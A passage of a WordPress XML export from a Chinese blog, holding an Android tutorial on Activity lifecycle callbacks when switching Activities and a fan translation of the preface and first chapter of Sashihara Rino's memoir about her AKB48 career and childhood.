		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[553]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android中的切换不同Activity的生命周期</title>
		<link>https://www.nervgeek.com/2016/02/01/android%e4%b8%ad%e7%9a%84%e5%88%87%e6%8d%a2%e4%b8%8d%e5%90%8cactivity%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f/</link>
		<pubDate>Mon, 01 Feb 2016 14:52:02 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=822</guid>
		<description></description>
		<content:encoded><![CDATA[在 <a href="https://www.nervgeek.com/pages/810.html" target="_blank">Android中的Activity生命周期</a> 这篇文章中，我们已经看到一个Activity的生命周期。
但一个程序很少只有一个Activity，所以这次验证一下<strong>两个Activity切换的过程中</strong>的生命周期。
继续 <a href="https://www.nervgeek.com/pages/810.html" target="_blank">Android中的Activity生命周期</a> 的Project，<strong>新建另一个Activity</strong>，<strong>名为Activity02。</strong>
在<strong>MainActivity</strong>添加一个按钮，跳转到<strong>Activity02</strong>上面。

<pre>findViewById(R.id.btnStartAnotherActivity).setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        startActivity(new Intent(MainActivity.this,Activity02.class));
        System.out.println("Change Activity!");
    }
});</pre>

在<strong>Activity02.java</strong>中的<code>Activity02</code>函数中重写<code>onStart</code>等函数。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/4NU6UWXUXBUG8EMX.png" rel="attachment wp-att-823"><img class="alignnone size-full wp-image-823" src="https://www.nervgeek.com/wp-content/uploads/2016/02/4NU6UWXUXBUG8EMX.png" alt="4NU6U(WXUXB{U}~G8)E&#96;M~X" width="1083" height="743" /></a>
<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/65MPQIZT_@7U0YTG.png" rel="attachment wp-att-827"><img class="alignnone wp-image-827" src="https://www.nervgeek.com/wp-content/uploads/2016/02/65MPQIZT_@7U0YTG.png" alt="65MP%QI~%Z$T_%~@7U(0YTG" width="323" height="593" /></a>
打开程序，点击跳转按钮，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: Change Activity!
com.nervgeek.mr9esx.androidactivity I/System.out: onPause
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onCreate
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onStart
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onResume
com.nervgeek.mr9esx.androidactivity I/System.out: onStop</pre>

点击按钮之后，日志输出<strong>Change Activity!</strong>，紧接着<strong>MainActivity</strong>就执行了<code>onPause</code>函数，同时<strong>Activity02</strong>开始创建、运行，当<strong>Activity02</strong>开始运行之后，<strong>MainActivity</strong>执行<code>onStop</code>函数，进入停止状态。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/USNZAEYM4Z02Q@6PEV5S.png" rel="attachment wp-att-829"><img class="alignnone wp-image-829" src="https://www.nervgeek.com/wp-content/uploads/2016/02/USNZAEYM4Z02Q@6PEV5S.png" alt="U]SNZ)AEYM4Z02Q{@6PEV5S" width="331" height="608" /></a>
点击退出，返回<strong>MainActivity</strong>的界面，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onPause
com.nervgeek.mr9esx.androidactivity I/System.out: onRestart
com.nervgeek.mr9esx.androidactivity I/System.out: onStart
com.nervgeek.mr9esx.androidactivity I/System.out: onResume
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onStop
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onDestroy</pre>

&nbsp;
&nbsp;
假如给<strong>Activity02</strong>替换一个主题样式，执行的函数又会不一样了。
打开<strong>AndroidManifest.xml</strong>文件，在<strong>Activity02</strong>里面添加

<pre>android:theme="@style/Base.Theme.AppCompat.Dialog"</pre>

那么现在已经变成一个弹窗了。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/2XD46R092T459Z2GQCS6X.png" rel="attachment wp-att-831"><img class="alignnone size-full wp-image-831" src="https://www.nervgeek.com/wp-content/uploads/2016/02/2XD46R092T459Z2GQCS6X.png" alt="2XD46R092{T459Z2GQCS6{X" width="1227" height="617" /></a>
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/C4MR4ULA@RG@O2H_T.png" rel="attachment wp-att-832"><img class="alignnone wp-image-832" src="https://www.nervgeek.com/wp-content/uploads/2016/02/C4MR4ULA@RG@O2H_T.png" alt="C4M{[%[R4~ULA@RG@O2H_$T" width="348" height="639" /></a>
运行程序，点击跳转按钮，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: Change Activity!
com.nervgeek.mr9esx.androidactivity I/System.out: onPause
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onCreate
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onStart
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onResume</pre>

&nbsp;
对比上一个跳转，<strong>MainActivity</strong>少执行了<code>onStop</code>这个函数，因为<strong>MainActivity</strong>还在背后已经可见，只执行<code>onPause</code>函数暂停界面。
&nbsp;
点击<strong>Activity02</strong>以外的地方，回到<strong>MainActivity</strong>，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onPause
com.nervgeek.mr9esx.androidactivity I/System.out: onResume
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onStop
com.nervgeek.mr9esx.androidactivity I/System.out: Activity02 onDestroy</pre>

<strong>Activity02</strong>暂停之后，<strong>MainActivity</strong>直接执行了<code>onResume</code>函数恢复页面，无需重新启动。
&nbsp;
对Activity生命周期比较有兴趣的话，日后开发可以输出日志查看。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>822</wp:post_id>
		<wp:post_date><![CDATA[2016-02-01 22:52:02]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-01 14:52:02]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android%e4%b8%ad%e7%9a%84%e5%88%87%e6%8d%a2%e4%b8%8d%e5%90%8cactivity%e7%9a%84%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[251]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 前章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83-%e5%89%8d%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 12:45:39 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=838</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/aa89c2b30f2442a76eb6e682d243ad4bd01302b1.jpg" rel="attachment wp-att-839"><img class="alignnone size-full wp-image-839" src="https://www.nervgeek.com/wp-content/uploads/2016/02/aa89c2b30f2442a76eb6e682d243ad4bd01302b1.jpg" alt="aa89c2b30f2442a76eb6e682d243ad4bd01302b1" width="580" height="946" /></a>
相信粉AKB48Group的人都对这个人不陌生，指原莉乃在AKB乃至艺能界中绝对能说得上是一个传奇。
借此书稍微了解一下宅姐二十年来的历程吧。
译者：正义の未来
非常感谢大大的翻译让我们看到如此好的书籍。
我自己稍微修改了一下一下格式、语序，让大家看得更流畅。
<!--more-->

<hr />

&nbsp;
<span style="font-size: 24pt;"><strong>逆转力 ～等待危机～</strong></span>
<span style="font-size: 10pt;">指原莉乃 （HKT48）</span>
&nbsp;
<strong>写在开始</strong>
输了。
第二名。
我在今年（2014年）的AKB48选拔总选举中，输给了麻友（渡边麻友），第二名。
因为去年拿到了意想不到的第一名，在很多场合宣言了[目标2连霸!]的愿望。
阿酱（前田敦子）和优子酱（大岛优子）都没有完成的事情，我果然还是没有可能实现。
<strong>[第二名，最终投票数14万1954票。HKT48，Team H，指原莉乃]</strong>
在开票活动会场，司会德光（和夫）先生叫到我名字的瞬间，就连自己感到吃惊，同时忍不住的是遗憾。
站在麦克风的前面，感情都爆发了出来。
<strong>[说实话，非常非常非常遗憾！！]</strong>
对获得第一名的麻友我一直很尊敬，因为是前辈，同时她为了AKB48拼命努力的姿态我一直都看在眼中。
对她，我是最纯粹的祝贺的心情。
但是，那一天，我还是，特别特别的遗憾。
今年的总选举战，我得到了很多很多粉丝的声援，但是在此之外，也听到了[打倒·指原] 的声音。
<strong>[王道麻友VS邪道指原]</strong>
关于这场决战的构图，我自己自身在选举演说VTR中也有所表现。
我想无论阿酱还是优子酱，不是都没有亲口明确说过 [我要2连霸] 么。
亲口这样宣称之后，我明白会有人反对我，但是，我还是说了。
因为去年得到了中心的位置，我想这是我的使命，说是报恩也许过于夸大，为了48G，我承担对我的厌恶，因为这样做，会让今年的总选举热闹非凡。
我想正是如此......才会有这样的结果，我心想<strong> [明明拼命的去努力了]</strong>，但<strong> [遗憾]</strong> 的心情愈渐膨胀。
没有谁能够理解我，大家都是敌人。
开票活动结束，返回后台的时候，这种心情也许会越来越强烈。
等待着我的，是我的伙伴，たかみなさん（高桥南）对我说<strong> [指原这一年真的很努力了哇]</strong>。咪酱（峯岸南）对我说 <strong>[さっしー（指原莉乃）真的为48组合付出了太多太多]</strong> 。
原来有理解我的人。
开心，我哭了。
在那之后，我去休息室对一直以来关照HKT48演唱会的舞台演出队伍道谢，我想去说 [感谢对我一直以来的支持]。
<strong>[辛苦了] [你已经尽力了哦] [演讲感觉很好哟]</strong>
面对大家赠予我的话语，是一个一直回答<strong> [其实超遗憾！]</strong> 的自己。现在能够得到这些，我好开心，忍不住又哭了。
至今为止，我从不会让工作人员看到自己的软弱的一面，我想对于自己是有好处的。
因为绝不希望听到类似这些话语。<strong>[虽然这么说，但さっしー一直受着照顾没什么不好的]</strong>。
就是这样的我，却很自然的把 <strong>[遗憾]</strong> 这个词语表达出来，能理解我的大家是多么温柔，我感到非常温暖。
输了，我得到了第二名，虽然很遗憾过，但却已不后悔。本来在整个48G近300人中间能得到第二名的成绩，其实是很厉害的事情。我明明没有什么值得一提的特长，多亏粉丝们的应援获得了第二名的成绩。
而且，再一次意识到了自己有那么多优秀的伙伴。
香甜睡过一晚醒来已是天明，我想<strong> [没有2连霸太好了！]</strong> 。高度上升的过高，被认为<strong> [绝对王者]</strong> 什么的是难以应对事情。
考虑到未来的事情，有挫折的一面作为故事才会变得更有意思哟。一个人的人生也是如此。面对一帆风顺的人会失去为其加油的动力。
我想没有挫折的故事没有起伏，没有值得担心的事情，那么不去应援也没有关系。
所以，遇到挫折，是一种幸运。
能有个诉苦的机会，那也是种幸运。
<strong>[一般来说不是要更遗憾些吗？]</strong>，这么对我说最困惑不过了，为什么，开票结束回家直到睡着，这6个小时一直沉浸在遗憾中，“已经”6个小时了！
但重新思考之后，我注意到我的人生就是从危机到逆转的累积。
正是危机到来，才能完成逆转。
从获得第一名到今年的总选举如此艰难，我想是没有可以逆转的机会。我想我的人生需要危机。
仿佛。
<strong>[真是的，奇怪的思考方式啊？]</strong>
这么说，也许确实是这样的啊。有这样感想的时候，得到了写作本书的邀请。
指原的思考方式是不是奇怪，我想请大家来判断。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>838</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 20:45:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 12:45:39]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83-%e5%89%8d%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="post_tag" nicename="%e6%8e%a8%e8%8d%90"><![CDATA[推荐]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[255]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第一章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b8%80%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 13:22:55 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=849</guid>
		<description></description>
		<content:encoded><![CDATA[<span style="font-size: 24pt;"><strong>第一章    危机推动我前行</strong></span>
&nbsp;
<strong>首先允许我自我介绍</strong>
我1992年11月21日生，21岁，大分县大分市出身，指原莉乃。被别人叫做 「さっしー」「さしこ」。
AKB48姐妹组合，以博多的专用剧场为据点活动的HKT48，Team H的成员。现在兼职HKT48剧场支配人。过去，我是AKB48的成员，初中3年级的时候，<strong>[AKB48第二回研究生（5期生）选拔]</strong>(2007年9月-10月举办）合格，第二年到东京开始进行活动。
其实最初，我想成为偶像的主要最大的原因是我自身的危机。
在这一章，我想说说我最初的危机，这是成为我<strong> [逆转力]</strong> 的原点，大分时代的故事。<!--more-->
<strong>八面玲珑与参谋</strong>
我出生在一个普通的家庭，爸爸妈妈哥哥4个人的家庭。真的真的是很普通的家庭。普通的父亲，普通的母亲，所以我的哥哥是超正经的人，和我完全不一样。性格开朗，深受大家欢迎，也有许多朋友，可我完全不同。
我的父母也是那样的类型，父亲母亲同样开朗，落落大方哦。像这样扭曲的性格，只有我自己。
我想我孩子的时候文静，内向。讨厌做显眼的事情，也不喜欢看到显眼的人。看到班里八面玲珑的同学就会想 <strong>[什么哟？]</strong>。
我曾经不擅长去面对八面玲珑的人哟。就算这样，现在自己却遗憾的成为了八面玲珑的人。
果然，还是父母的遗传。爸爸超积极，八面玲珑，爽快。妈妈大概拥有谋士的才能。
2012年讲谈社帮我发行了书名《さしこ》的写真书，（2012年1月刊）在书的最后，记载了妈妈写给我的信件。当时我在东京，虽然和妈妈过两人生活，但妈妈说了谎哟。
在信的最后，<strong>[我想马上就该回去大分了吧，因为我已经看到了女儿十足的成长]</strong>。书发行之后，大概1年的时间还在东京呢，东京的生活很开心，完全不想回去了。为了让读者感动，故意撒了个谎哟。
说到性格，不是父母决定的吗，父亲八面玲珑的爽快性格与母亲的谋士的才能。我好像将父母性格上的优点都继承下来了呢。
把<strong> [喜欢]</strong> 的心情去作为原动力
我还是孩子的时候喜欢的是偶像。说是孩子的时候，直到现在也非常喜欢。喜欢的契机是小学1年级的时候观看《ASAYAN》。因诞生早安少女成员而闻名的选秀综艺节目。恰好的时机是，作为早安少女的第3期成员后藤真希酱加入，<strong>[LOVEマシーン]</strong> 出版的时候。我喜欢偶像的原点是真希，这之后，继而喜欢上龟井绘里酱
（早安少女6期成员）℃-ute的萩原舞酱，Berryz工房的熊井友理奈酱。
小学时班里的女孩子们也热衷于早安少女，同学们在教室和朋友们交换卡片。大概在那个时候我也与大家拥有着同样的情绪喜欢着她们。但随着学年的增长，大家都开始喜欢其他的东西。投球啊，男子偶像啊。
我还是一直不变的喜欢着女孩子偶像，这时发现 <strong>[啊？只有我被剩下来了]</strong>。
小学高年级的时候，喜欢偶像，但是，我喜欢女子偶像的事情，却渐渐变得说不出口。这种能读懂周围气氛的感觉，我想我很早之前就拥有了。
但是喜欢的东西就是喜欢，不管别人是怎么想的，我这里不会变的。
喜欢偶像，喜欢偶像的音乐，舞蹈......直到现在，这种心情从未改变。
<strong>[喜欢]</strong> 的心情是直到今天，成为让我作为偶像去坚持活动的原动力。
世界并不是只有学校。
将我心中<strong> [喜欢]</strong> 的心情加速起来的是网络，我小学2年级的时候，家里安装了电脑。那时我想，世界都改变了。就如在日常生活中绝对没办法入手的早安少女情报，在网络上有特别多的转载。
看看动画，看看照片，读一读粉丝写的博客啊，以及原文网站。
我喜欢写文章，并且感觉擅长写作的原因，都多亏了那时在网络上读了许多形形色色的文章。是网络让我学到了用文章使人快乐的“韵律”。
开始看2CH（2ちゃんねる）的时候是小学5年纪。在探寻原文网站的路途中，我感觉自己到达了一个深入的世界。
虽然到现在才说，我还在看2CH，直至今日。2CH对我的人格形成有着很大的影响，这一点不会有错。
当时主要看的版块是 <strong>[早安少女 狼]</strong>（モーニング娘。（狼））版块。最早我只是潜水看帖哦，中途开始，自己创建了网名，开始去写一些评论。现在想想还是很厉害的人呢。这样一个小学5年级的女孩子，除了我之外没有了吧。虽说当然如此。
初中1年级开始初中3年级中间为止，自己开设了自己的博客。早安少女的应援博客。在这里把<strong> [喜欢]</strong> 的心情表达出来，我和来读我博客的人相互交换意见与看法的同时，<strong>[喜欢]</strong> 的情绪渐渐的高涨。毫无疑问这与我的现在也息息相关。
跳入网络的世界，有一天有一件忽然明白的事情。
[<strong>世界，不只是只有学校。不只是只有大分。]</strong>
今天自己所在的这个地方，如果过的苦涩，生活艰辛，转移去别的世界就好。也许新的世界你一直都无法进入，但只要想到有与这里不同更适合自己的地方，心情会变得放松。
这个时候感受到的事情，我感觉它成为时至今日我思考方式的基本。
<strong>电脑在客厅</strong>
我一直都是客观看待一切，冷冷淡淡的人。我想这完全是怪网络。但是，我也相信，无论在什么地方都有人间的温情。真的相信！
详细的故事请请让我在后面的文章中叙述，说起来，尝试探索我产生这种感觉的理由，我想那是在大分的时候，我感觉网络与家庭有着一种平衡。
父母从来都不会对我生气，但也没有过度的保护、放任。当然并不是因为这些事情感觉到了<strong> [冷淡]</strong> ，只是得到了自由的抚养方式。
我想去做的事情从来不会去阻止哟。在我热衷于网络的时候，从来没有说过阻止我的话语。也从来没有对我灌输过<strong> [网络是不好的东西]</strong> 。
现在回顾过去想到的是，因为电脑放在客厅，在父母能看到的地方去使用电脑也许是一个好的表现。网络和家庭，对于我来说是心情舒适的生活空间。两者在家中的客厅里重叠着存在着。
我能在东京一直努力做着这份工作，是不是多亏了我的家庭呢，最近，总是这样想。不管有多么多么艰辛多么困苦的事情，都有能够接纳我的地方。绝对会有温情迎接我的地方，我能够确信。
<strong>作为一个观众的时候不要忘记自己</strong>
我想我作为偶像的一个优势是，我自己自身本来就是一个偶像宅。对偶像的爱，我有自信不输给任何人。
也许完成了这种爱情是第一次去看偶像演唱会的时候。
小学5年级时，在大分的グランシアタ（现在的iichiko综合文化中心）早安少女的成员们来到这儿！我去拜托我的妈妈，我们两个人观看了演唱会。
我记得我们坐在第一层稍微靠上的28列，其实是个非常靠后的位子。不过グランシアタ并不是那么大的会场，并不是看到歌手如豆粒般大小的距离。见到在舞台上舞动着的真实的真希酱，超感动。
一次的经历让我对演唱会热衷起来。说起偶像宅，分为两个种类。总结而言，第一种是在家里应援的<strong> [在家宅]</strong> ，另一种是参加演唱会，参加活动展现自己的 <strong>[现场宅]</strong> 。我完全是后者。
演唱会在福冈举办的机会很多，拿着好不容易得到的演唱会入场券，一次又一次的和妈妈坐上特快列车......
现在我成为了偶像，每当看到在演唱会入场券贩卖场前面，看到小女孩和妈妈排着队伍的场景，不禁会怀念起自己和母亲。每当收到来自小姑娘粉丝的信件的时候，因为自己过去也做过同样的事情，现在的这个姑娘和儿时的我是不是同样的心情呢，想到这里我真的很开心。
所以我绝对不情愿取消已经告知举行的公演，演唱会前无论发生怎样的问题我也要登场。如果自己是来到现场的粉丝，自己最支持最想见到的孩子因为身体不适而休息的话，不仅仅会变得担心，而且我想这是件很遗憾的事情，好不容易才来到了演唱会。
来到现场的人们，各自各自，花了钱来到这儿，向公司请假来到这儿，向学校请假来到这儿，向社团活动请假来到这儿。就像我一样的偶像宅，我过去也是如此，所以他们的心情我最理解。正因为理解，我会在我自己的<strong> [现场]</strong> 付出最大的努力哟。
<strong>梦想与现实的联动</strong>
那时自己憧憬的地方，现在已经作为工作成为现实。冷静的思考之后，我感觉真的是一件很厉害的事。
说到这，只是单纯的去憧憬，成为不了偶像，一定要有<strong> [想要成为]</strong> 这种强烈的心境。
让我产生这种心境的契机，我想是AKB48。
中学2年级的3月，第一次去看了AKB48的演唱会，全国巡演(春のちょっとだけ全国ツアー～まだまだだぜAKB48!~)福冈公演。
当然在网络上已经入手了很多情报。演唱会的曲目目录是以A4th（TeamA的第四次公演）的歌曲《ただいま恋愛中》为中心。在东京秋叶原有专用的AKB48剧场，每一天都有舞台演出......
好羡慕她们。我开始有了 <strong>[我也想尝试去站上舞台]</strong> 的想法。
我感觉也许<strong> [成为偶像]</strong> 还远远不够。但是我想去尝试<strong> [站在舞台上]</strong> ，我感觉就算是我也可以努力。
由<strong> [站上舞台]</strong> 的现实开始，到<strong> [成为偶像]</strong> 的梦想之间，我感觉我找到了前方的道路。
梦想与现实，我感受到两者之间的联动慢慢开始。
正巧是那个时候，发生了感觉心痛的变故，现在自己的状况是一个危机。
<strong>如果讨厌现在生活的空间，那么就满怀勇气探寻新世界</strong>
与顺畅快乐的宅生活相反的是，学校生活并不顺利。虽然放学后的吹奏社团活动很开心，但教室生活完全不行。初中2年级的时候，遭遇了轻微的欺负。被体育会女子小组莫名其妙的被嘲笑，当面说我的坏话，故意的无视我。初中3年级的时候，渐渐的过分起来，有一天家里的邮箱被放入了<strong> [请你不要再来学校]</strong> 的信件。
直至这封信的到来，我明白她们更加的讨厌我了。
啊~感觉真的是烦心，啊~真的是累了。上学的事情变得反感，渐渐的我不再去学校了。
但是我还有好好的生活哦，早上早早的起床，白天的时候帮助家里做家务，放学后的时间去补习班读书。
虽然不去学校，但却没有黑白颠倒的生活，真是很少见的类型。
在我没有注意到的地方，我想父母有着父母的烦恼。但是他们没有强行让我去学校。<strong>[如果讨厌学校那么不去不也挺好的吗？]</strong> 父母总是把我的心情作为最重要的东西。
就在这样那样的事情中，到了初中3年级的9月，到了不得不决定毕业后进路的时期。总之，我想从大分走出去，去一个谁都不知道我的地方，我想重置我的全部。
前面说到过的，和跳入网络世界时有一样的心情。厌恶现在的生活，那么去一个新世界就好了。如果对现在在学校被欺负，在职场没法很好的处理人际关系的人给出我能够给出建议的话。我想我的这些经历可以作为参考。
<strong>用“逆转力”走向偶像之路</strong>
初中的时候，我的英语成绩自以为豪哦。所以，父母和补习班的老师都建议我去读本地的高中国际班，之后想让我去留学。
但是，我自作主张偷偷的应募了AKB48的选拔。
第一次的书类审查通过了，因为第二次的审核在东京，那时候我第一次对父母表达了自己的想法。
<strong>[我要去东京，我想成为偶像]</strong>。
刚刚说到多亏了进入网络世界，我明白了<strong> [感到痛苦改变了就好，新的空间进入了就好。]</strong> 。
以这个想法为原点，当时在读初中3年级的我拼命去找寻到的偶像，这是可以走出大分成为偶像的道路。
最终审查也合格了。
虽然妈妈说过会支持我，还有嘴上说着<strong> [反正也不会合格]</strong> 而允许我去参加选拔的爸爸，到最后真的不会反对我吗，为此而感到不安。战战兢兢把结果告诉父母之后，<strong>[按照你喜欢的去做] [妈妈可以陪着你一起去东京哦]</strong> 父母这样对我说。
现在回过头来想一想，不去上学的女儿突然说<strong> [我想去东京]</strong> ，父母不是会变得非常担心吗。而且是<strong> [想成为偶像]</strong> 什么的。还是再一次回到正经的道路上吧，我想会给孩子灌输这种建议。但是正是我得到了允许，我今天才会在这里。果然，我要感激我的父母。
也要对选择我的评审员表示感谢。而且，我想表扬自己，对自己的勇气。
从闭门不出，到成为偶像。把危机变为机遇，这是我的“逆转力”的最初的体验。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>849</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 21:22:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 13:22:55]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b8%80%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
